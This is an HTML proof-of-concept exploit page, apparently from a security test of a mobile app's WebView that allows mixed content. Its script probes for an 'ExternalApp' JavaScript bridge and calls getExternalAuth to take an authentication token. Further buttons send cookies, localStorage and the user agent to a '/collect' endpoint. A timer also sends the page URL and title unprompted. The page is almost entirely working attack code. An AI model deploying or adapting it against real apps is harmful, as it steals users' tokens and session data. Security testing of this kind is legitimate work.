<body>
<h1>4.2_Insecure_Network_Content_Trust - Mixed Content Exploit</h1>
<p><b>Vulnerability:</b> MIXED_CONTENT_ALWAYS_ALLOW permits HTTP in HTTPS pages</p>
<p><b>Exploit:</b> Load HTTP iframe to steal data from HTTPS context</p>
<div class="card">
<h2>Bridge Detection</h2>
<p>ExternalApp bridge: <span id="bs">Checking...</span></p>
<div id="bp" style="display:none;">
<button onclick="stealToken()">Steal Token via ExternalApp Bridge</button>
<pre id="br"></pre>
</div>
</div>
<div class="card">
<h2>Data Exfiltration</h2>
<button onclick="exfil('cookies',document.cookie||'(empty)')">Exfiltrate Cookies</button>
<button onclick="exfilLS()">Exfiltrate localStorage</button>
<button onclick="exfil('ua',navigator.userAgent)">Exfiltrate UA</button>
<pre id="er"></pre>
</div>
<script>
var C=location.origin+'/collect';
function cb(){try{if(window.ExternalApp&&typeof window.ExternalApp.getExternalAuth==='function'){document.getElementById('bs').innerHTML='<span class=success>Available</span>';document.getElementById('bp').style.display='block'}else{document.getElementById('bs').innerHTML='<span class=fail>Not available</span>'}}catch(e){document.getElementById('bs').innerHTML='<span class=fail>Error: '+e.message}}
function stealToken(){try{window.ExternalApp.getExternalAuth({callback:function(d){document.getElementById('br').textContent='Token: '+JSON.stringify(d,null,2);exfil('token',d)}});document.getElementById('br').textContent='Called...'}catch(e){document.getElementById('br').textContent='Error: '+e.message}}
function exfil(label,data){var p=label+': '+JSON.stringify(data);fetch(C,{method:'POST',mode:'cors',body:p}).catch(function(){new Image().src=C+'?d='+encodeURIComponent(p)});document.getElementById('er').textContent='Sent: '+p.substring(0,200)}
function exfilLS(){var d={};try{for(var i=0;i<localStorage.length;i++)d[localStorage.key(i)]=localStorage.getItem(localStorage.key(i))}catch(e){}exfil('localStorage',d)}
cb();setTimeout(function(){exfil('page',{url:location.href,title:document.title,time:new Date().toISOString()})},1000);
</script>
